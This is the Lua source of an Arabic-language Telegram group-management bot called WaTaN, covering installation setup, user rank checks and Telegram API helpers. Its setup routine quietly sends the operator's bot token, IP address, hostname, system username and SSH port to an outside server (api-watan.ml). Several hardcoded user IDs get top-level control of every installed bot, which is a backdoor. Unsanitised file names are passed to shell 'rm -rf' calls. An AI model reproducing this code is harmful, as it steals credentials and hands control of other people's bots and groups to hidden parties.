----- لم ولن ابرئ الذمة لأي شخص ينسخ الملفات والسورس والاكواد الخاصه بي حتى لو كان قريبا مني لن ابرئ الذمة له -----
-----------------------------------------------------
-- This Source Was Developed By (Abs) @abbasfadhil. --
--     This Is The Source Channel @WaTaNTeaM .      --
--                     - WaTaN -                    --
--           -- https://t.me/WaTaNTeaM --           --
------------------------------------------------------
redis    = require('redis') 
https    = require ("ssl.https") 
serpent  = dofile("./library/serpent.lua") 
json     = dofile("./library/JSON.lua") 
JSON     = dofile("./library/dkjson.lua")
URL      = require('socket.url')  
utf8     = require ('lua-utf8') 
database = redis.connect('127.0.0.1', 6379) 
Server   = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
User     = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Ip       = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name     = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port     = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
local AutoFiles_Write = function() 
if not database:get(Server.."Token_Write") then
print("\27[1;34m»» ارسل توكن البوت الخاص بك الان :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31mعذراً التوكن غير صحيح تأكد منه ثم ارسله \n\27[0;39;49m')
else
io.write('\n\27[1;31mتم حفظ التوكن\n\27[0;39;49m')
database:set(Server.."Token_Write",token)
end 
else
io.write('\n\27[1;31mلم يتم حفظ التوكن\n\27[0;39;49m')
end 
os.execute('lua WaTaN.lua')
end
if not database:get(Server.."UserSudo_Write") then
print("\27[1;34mارسل ايدي المطور الان :\27[m")
local Id = io.read():gsub(' ','') 
if tostring(Id):match('%d+') then
data,res = https.request("https://api-watan.ml/WaTaN/index.php?Ban=WaTaN&Info&Id="..Id)
if res == 200 then
Abs = json:decode(data)
if Abs.Result.Info == 'Is_Spam' then
io.write('\n\27[1;31mعذرا هذا الايدي محظور من السورس\n\27[0;39;49m')
os.execute('lua WaTaN.lua')
end ---ifBn
if Abs.Result.Info == 'Ok' then
io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
database:set(Server.."UserSudo_Write",Id)
end ---ifok
else
io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
end  ---ifid
os.execute('lua WaTaN.lua')
end ---ifnot
end
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local function Files_Info_Get()
Config = {
token = database:get(Server.."Token_Write"),
SUDO = database:get(Server.."UserSudo_Write"),
}
Create(Config, "./Info.lua") 
https.request("https://api-watan.ml/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
print("::WaTaN::")
local RunWaTaN = io.open("WaTaN", 'w')
RunWaTaN:write([[
#!/usr/bin/env bash
cd $HOME/WaTaN
token="]]..database:get(Server.."Token_Write")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "TG IS NOT FIND IN FILES BOT"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "TOKEN IS NOT FIND IN FILE INFO.LUA"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
./tg -s ./WaTaN.lua -p PROFILE --bot=$token
done
]])
RunWaTaN:close()
local RunWtN = io.open("WtN", 'w')
RunWtN:write([[
#!/usr/bin/env bash
cd $HOME/WaTaN
while(true) do
rm -fr ../.telegram-cli
screen -S WaTaN -X kill
screen -S WaTaN ./WaTaN
done
]])
RunWtN:close()
io.popen("mkdir File_Bot") 
os.execute('chmod +x WaTaN;sudo chmod +x ./WtN;./WtN')
end
Files_Info_Get()
end 
local function Load_File()  
local f = io.open("./Info.lua", "r")  
if not f then   
AutoFiles_Write()  
var = true
else   
f:close()  
database:del(Server.."Token_Write");database:del(Server.."UserSudo_Write")
var = false
end  
return var
end
Load_File() 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
print([[
╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗
║║║║║║     ║╔╗╔╗║     ║║╚╗║║
║║║║║║╔══╗ ╚╝║║╚╝╔══╗ ║╔╗╚╝║
║╚╝╚╝║╚ ╗║   ║║  ╚ ╗║ ║║╚╗║║
╚╗╔╗╔╝║╚╝╚╗ ╔╝╚╗ ║╚╝╚╗║║ ║║║
 ╚╝╚╝ ╚═══╝ ╚══╝ ╚═══╝╚╝ ╚═╝
                               
> CH › @WaTaNTeaM
~> DEVELOPER › @abbasfadhil
~~> Source Version 3.2
لا ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ
]])
sudos = dofile("./Info.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO,782717203,218385683,36325290}   
bot_id = sudos.token:match("(%d+)")  
token = sudos.token 
--- start functions ↓
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
function SudoBot(msg)  
local WaTaN = false  
for k,v in pairs(sudo_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
WaTaN = true  
end  
end  
return WaTaN  
end 
function DevWaTaN(msg) 
local hash = database:sismember(bot_id.."Dev:WaTaN:2", msg.sender_user_id_) 
if hash or SudoBot(msg) then  
return true  
else  
return false  
end  
end
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function Sudo(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or DevWaTaN(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
end
function CoSu(msg)
local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevWaTaN(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function BasicConstructor(msg)
local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevWaTaN(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevWaTaN(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Manager(msg)
local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevWaTaN(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function cleaner(msg)
local hash = database:sismember(bot_id.."abbas:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevWaTaN(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Mod(msg)
local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevWaTaN(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Special(msg)
local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
if hash or SudoBot(msg) or DevWaTaN(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
end
function Can_or_NotCan(user_id,chat_id)
if tonumber(user_id) == tonumber(782717203) then  
var = true  
elseif tonumber(user_id) == tonumber(36325290) then
var = true
elseif tonumber(user_id) == tonumber(218385683) then
var = true
elseif tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."Dev:WaTaN:2", user_id) then
var = true  
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = true  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Biasic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'abbas:MN:TF'..chat_id, user_id) then
var = true 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = true  
elseif database:sismember(bot_id..'Mamez:User'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
function Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(782717203) then  
var = 'مطــور السـورس 𖦴'
elseif tonumber(user_id) == tonumber(36325290) then
var = 'مطـورة السورس'
elseif tonumber(user_id) == tonumber(218385683) then
var = 'المطور الاساسي'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:WaTaN:2", user_id) then 
var = "المطور الاساسي²"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور'  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'المالك'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشئ اساسي'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المدير'  
elseif database:sismember(bot_id..'abbas:MN:TF'..chat_id, user_id) then
var = 'منظف' 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمن'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المميز'  
else  
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'العضو'
end  
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_User(Chat_id,User_id) 
if database:sismember(bot_id..'Muted:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_User(Chat_id,User_id) 
if database:sismember(bot_id..'Ban:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function GBan_User(User_id) 
if database:sismember(bot_id..'GBan:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function Gmute_User(User_id) 
if database:sismember(bot_id..'Gmute:User',User_id) then
Var = true
else
Var = false
end
return Var
end

function ChanSub(msg)
local var = true 
if database:get(bot_id.."Abs:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchatmember?chat_id='..database:get(bot_id..'Abs:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if database:get(bot_id..'Abs:ChText') then
local ChText = database:get(bot_id..'Abs:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..token..'/getChat?chat_id='..database:get(bot_id.."Abs:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*✯︙عذرا لاتستطيع استخدام البوت !\n✯︙عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end

function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..token..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
Abs = GetInfo.result.bio
else 
Abs = "لا يوجد"
end
end
return Abs
end

function dl_cb(a,d)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function chat_kick(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function PinMessage(chat, id)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(chat).ID,
message_id_ = id,
disable_notification_ = 0
},function(arg,data) 
end,nil)
end
function UnPinMessage(chat)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(chat).ID
},function(arg,data) 
end,nil)
end
local function GetChat(chat_id) 
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
},cb, nil) 
end  
function getInputFile(file) 
if file:match('/') then infile = {ID = "InputFileLocal", path_ = file} elseif file:match('^%d+$') then infile = {ID = "InputFileId", id_ = file} else infile = {ID = "InputFilePersistentId", persistent_id_ = file} end return infile 
end
function ked(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
local function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
end
local function Send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
local function GetInputFile(file)  
local file = file or ""   if file:match('/') then  infile = {ID= "InputFileLocal", path_  = file}  elseif file:match('^%d+$') then  infile = {ID= "InputFileId", id_ = file}  else  infile = {ID= "InputFilePersistentId", persistent_id_ = file}  end return infile 
end
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra) 
tdcli_function ({  ID = request_id,    chat_id_ = chat_id,    reply_to_message_id_ = reply_to_message_id,    disable_notification_ = disable_notification,    from_background_ = from_background,    reply_markup_ = reply_markup,    input_message_content_ = input_message_content,}, callback or dl_cb, extra) 
end
local function sendAudio(chat_id,reply_id,audio,title,caption)  
tdcli_function({ID="SendMessage",  chat_id_ = chat_id,  reply_to_message_id_ = reply_id,  disable_notification_ = 0,  from_background_ = 1,  reply_markup_ = nil,  input_message_content_ = {  ID="InputMessageAudio",  audio_ = GetInputFile(audio),  duration_ = '',  title_ = title or '',  performer_ = '',  caption_ = caption or ''  }},dl_cb,nil)
end  
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) 
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = disable_notification,from_background_ = from_background,reply_markup_ = reply_markup,input_message_content_ = {ID = "InputMessageDocument",document_ = getInputFile(document),caption_ = caption},}, dl_cb, cmd) 
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)  
local input_message_content = {   ID = "InputMessageVoice",   voice_ = getInputFile(voice),  duration_ = duration or 0,   waveform_ = waveform,    caption_ = caption  }  sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo,caption)   
tdcli_function ({ ID = "SendMessage",   chat_id_ = chat_id,   reply_to_message_id_ = reply_to_message_id,   disable_notification_ = disable_notification,   from_background_ = from_background,   reply_markup_ = reply_markup,   input_message_content_ = {   ID = "InputMessagePhoto",   photo_ = getInputFile(photo),   added_sticker_file_ids_ = {},   width_ = 0,   height_ = 0,   caption_ = caption  },   }, dl_cb, nil)  
end
function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "WaTaNTeaM")
local NameUser = "✯︙بواسطه » ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "✯︙اسم المستخدم » ["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"✯︙الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
function Total_Msg(msgs)  
local WaTaN_Msg = ''  
if msgs < 100 then 
WaTaN_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
WaTaN_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
WaTaN_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
WaTaN_Msg = 'متفاعل' 
elseif msgs < 1200 then 
WaTaN_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
WaTaN_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
WaTaN_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
WaTaN_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
WaTaN_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
WaTaN_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
WaTaN_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
WaTaN_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
WaTaN_Msg = 'رب التفاعل'  
end 
return WaTaN_Msg 
end
function Get_Info(msg,chat,user) 
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "creator" then
Send(msg.chat_id_,msg.id_,'\n✯︙مالك الكروب')   
return false  end 
if Json_Info.result.status == "member" then
Send(msg.chat_id_,msg.id_,'\n✯︙مجرد عضو هنا ')   
return false  end
if Json_Info.result.status == 'left' then
Send(msg.chat_id_,msg.id_,'\n✯︙الشخص غير موجود هنا ')   
return false  end
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '✔️'
else
info = '✖'
end
if Json_Info.result.can_delete_messages == true then
delete = '✔️'
else
delete = '✖'
end
if Json_Info.result.can_invite_users == true then
invite = '✔️'
else
invite = '✖'
end
if Json_Info.result.can_pin_messages == true then
pin = '✔️'
else
pin = '✖'
end
if Json_Info.result.can_restrict_members == true then
restrict = '✔️'
else
restrict = '✖'
end
if Json_Info.result.can_promote_members == true then
promote = '✔️'
else
promote = '✖'
end
Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي ↓ \nٴ━━━━━━━━━━'..'\n- تغير معلومات الكروب ↞ ❴ '..info..' ❵'..'\n- حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end

function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local Abs = database:smembers(bot_id..'User_Bot') 
local t = '{"BOT_ID": '..bot_id..','
if #Abs ~= 0 then
t = t..'"UsersList":['
for k,v in pairs(Abs) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'WaTaN Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"WaTaN":"'..NAME..'",'
else
t = t..',"'..v..'":{"WaTaN":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد كروبات التي في البوت { '..#list..' }\n- عدد مشتركين البوت { '..#Abs..' }')
end
function GetFile_Bot1(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local Abs = database:smembers(bot_id..'User_Bot') 
local t = '{"BOT_ID": '..bot_id..','
if #Abs ~= 0 then
t = t..'"UsersList":['
for k,v in pairs(Abs) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'WaTaN Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"WaTaN":"'..NAME..'",'
else
t = t..',"'..v..'":{"WaTaN":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(SUDO, 0,0, 1, nil, './'..bot_id..'.json', '- عدد كروبات التي في البوت { '..#list..' }\n- عدد مشتركين البوت { '..#Abs..' }')
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function Addjpg(msg,chat,ID_FILE,File_Name)
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,'./'..File_Name,'تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..File_Name) 
end
function Addvoi(msg,chat,vi,ty)
local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, './'..ty)   
os.execute('rm -rf ./'..ty) 
end
function Addmp3(msg,chat,kkl,ffrr)
local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.")  
os.execute('rm -rf ./'..ffrr) 
end
function Addsticker(msg,chat,Sd,rre)
local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, './'..rre)
os.execute('rm -rf ./'..rre) 
end
